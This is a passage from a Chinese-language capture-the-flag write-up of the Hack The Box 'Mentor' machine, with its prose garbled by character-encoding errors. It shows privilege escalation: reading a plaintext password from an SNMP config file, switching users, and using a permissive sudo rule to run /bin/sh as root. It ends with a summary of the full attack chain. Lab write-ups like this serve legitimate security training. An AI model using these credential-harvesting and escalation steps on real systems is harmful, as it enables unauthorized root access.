  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:d789
0 updates can be applied immediately.
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ pwd
/home/svc

```

æƒé™æå‡
----

ä»æœ¬åœ°ä¼ ä¸€ä¸ª`linpeas`å·¥å…·ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œåˆ†æå¯çœ‹åˆ°æœ‰ SNMP æœåŠ¡çš„ç›¸å…³é…ç½®æ–‡ä»¶

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShJxr8NRdS9x37UX8Z6QDFhQDpcaCibH9DfglDu8GpW46oF4MjLqYouJA/640?wx_fmt=png)

æŸ¥çœ‹`/etc/snmp/snmpd.conf`ï¼Œå¯çœ‹åˆ°æœ‰ä¸ªå¯†ç ï¼Œç«™ç‚¹å±ä¸»æ˜¯ jamesï¼Œé‚£åº”è¯¥å°±æ˜¯ james çš„å¯†ç ï¼ˆè¿™ä¸ªå¯†ç è·Ÿä¹‹å‰çš„å¯†ç ä¸ä¸€æ ·ï¼Œå¯èƒ½å‰é¢çš„é‚£ä¸ªåªæ˜¯å¹³å° james ç®¡ç†å‘˜çš„å¯†ç ï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯ linux ç»ˆç«¯ james ç”¨æˆ·çš„å¯†ç ï¼‰

```
svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShO8EDvlpIoxPsoYnEkg7TDfAnW0exZLXROAuqNDibKgM83sEj7oqWcvQ/640?wx_fmt=png)

```
SuperSecurePassword123__

```

åˆ‡æ¢åˆ° james ç”¨æˆ·ï¼Œæ‰§è¡Œ`sudo -l`å¯çœ‹åˆ° james ç”¨æˆ·æœ‰æ‰§è¡Œ`/bin/sh`å‘½ä»¤çš„æƒé™

```
svc@mentor:/tmp$ su james
Password: 
james@mentor:/tmp$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:/tmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User james may run the following commands on mentor:
    (ALL) /bin/sh

```

æ‰§è¡Œ`/bin/sh`ï¼ŒæˆåŠŸè·å– root æƒé™

```
james@mentor:/tmp$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```

Overï¼

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShLChDtK2EhZsrVAsdia6phy7iawKhYGGbT9CPN1e4P3UuyV91FiajbnI6w/640?wx_fmt=png)

æ€»ç»“
--

1.

ä¿¡æ¯æ”¶é›†å¾—åˆ°`Swagger UI`é¡µé¢ã€SNMP æœåŠ¡ã€è¯¸å¤šæœ‰æ•ˆç›®å½•ï¼›

2.

SNMP é…ç½®ä¿¡æ¯æ³„éœ²ç®¡ç†å‘˜ james å¯†ç ï¼›

3.

ç™»å½• james ç”¨æˆ·è·å–ç®¡ç†å‘˜ JWTï¼›

4.

åˆ©ç”¨ç®¡ç†å‘˜ JWT å‘½ä»¤æ‰§è¡Œè·å–è™šæ‹Ÿ root æƒé™ï¼›

5.

å‘ç° PostgreSQL æ•°æ®åº“ï¼Œä¸ä¹‹äº¤äº’è·å– ssh è´¦æˆ·ï¼›

6.

ç™»å½• ssh è´¦æˆ·è¿è¡Œ linpeasï¼Œä» SNMP é…ç½®æ–‡ä»¶æ‹¿åˆ° james ç»ˆç«¯å¯†ç ï¼›

7.

åˆ‡æ¢ james ç»ˆç«¯ç”¨æˆ·ï¼Œææƒè·å– root æƒé™ã€‚

å‚è€ƒ
--

Hackthebox Mentor Writeupï¼šhttps://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup

å®æˆ˜ SNMP æœåŠ¡æ”»å‡»ï¼šhttps://www.freebuf.com/articles/network/319234.html